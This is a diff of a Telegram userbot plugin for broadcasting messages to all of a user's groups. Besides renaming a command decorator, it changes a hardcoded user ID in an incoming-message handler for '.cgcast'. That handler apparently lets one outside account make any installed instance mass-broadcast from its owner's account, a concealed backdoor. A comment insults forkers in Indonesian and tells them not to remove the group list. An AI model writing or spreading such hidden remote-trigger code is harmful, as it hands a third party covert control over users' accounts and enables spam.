@@ -11,7 +11,7 @@
 # t.me/SharingUserbot & t.me/Lunatic0de
 
 from userbot import CMD_HELP, CMD_HANDLER as cmd
-from userbot.utils import edit_or_reply, edit_delete, bing_cmd
+from userbot.utils import edit_or_reply, edit_delete, zean_cmd
 from userbot.events import register
 
 # KALO FORK/CLONE ID GC DI BAWAH G USH DI HAPUSS YAA KONTOLL
@@ -36,8 +36,8 @@ GCAST_BLACKLIST = [
 ]
 
 
-@bing_cmd(pattern="gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1337194042,
+@zean_cmd(pattern="gcast(?: |$)(.*)")
+@register(incoming=True, from_users=5004651469,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
@@ -66,7 +66,7 @@ async def gcast(event):
     )
 
 
-@bing_cmd(pattern="gucast(?: |$)(.*)")
+@zean_cmd(pattern="gucast(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if xx:
